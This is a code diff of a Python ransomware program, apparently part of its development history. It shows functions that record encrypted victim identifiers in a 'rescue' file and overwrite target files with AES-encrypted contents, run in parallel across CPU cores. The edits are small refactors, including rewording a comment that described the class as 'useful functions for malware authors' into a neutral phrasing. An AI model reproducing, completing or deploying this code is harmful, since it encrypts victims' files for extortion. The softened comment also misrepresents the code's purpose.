@@ -5,12 +5,12 @@ from Crypto.Util.Padding import pad
 from base64 import b64encode, b64decode
 from requests import get
 from requests.exceptions import RequestException
-from system import System
 from multiprocessing import Pool, TimeoutError
 from os import getuid, getlogin, cpu_count, system, walk
 from os.path import join, expanduser
 from uuid import uuid4
 from time import time
+from sys import exit
 import json
 import platform
 
@@ -43,7 +43,7 @@ class Runtime:
 import platform
 
 
-# Portable system class with useful functions for malware authors.
+# Portable system class used to collect useful information.
 class System:
     def __init__(self):
         self.inet_connection = self.__check_inet_connection()
@@ -57,8 +57,7 @@ class System:
         self.exec_type = platform.architecture()[1]
         self.machine = platform.machine()
 
-
-    # 
+    
     def __check_inet_connection(self):
         """Cross platform method of pinging Google 
         to check for internet connectivity."""
@@ -73,7 +72,6 @@ class System:
             return False
 
 
-    # 
     def __get_public_ip(self):
         """A convenient API call. If internet, 
         get the current public ip. """
@@ -169,6 +167,7 @@ def aesctr_encrypt(encrypt_me):
 
     return rsa_ct, aes_ct, nonce
 
+
 def record_victim_info(rsa_pubkey):
     """ Generate the ransomware key-value JSON database, 
     and update it with an encrypted string of information
@@ -188,11 +187,6 @@ def record_victim_info(rsa_pubkey):
     json_string = {'id': {'idstring': id_ctrsa, 'aescbc_key': id_ctaes, 'aescbc_iv': id_iv}}
     with open(RESCUE_FILE1, 'w') as f:
         json.dump(json_string, f)    
-
-
-def display_db():
-    with open(RESCUE_FILE1, 'rb') as f:
-        print(json.dumps(f, indent=4))
 
 
 def generate_session_keys(rsa_pubkey):
@@ -260,7 +254,6 @@ def exec_ransomware_attack(file_path):
         print(f'File {file_path} encrypted in process {getuid()}') 
     with open(file_path, 'wb') as f:
         f.write(aes_ct)
-
     return 0
 
     
@@ -274,3 +267,4 @@ if __name__=='__main__':
     with Pool(victim_sys.cores - 1) as pool:
         pool.map(exec_ransomware_attack, target_files)
     runtime.elapsed_time()
+    sys.exit()
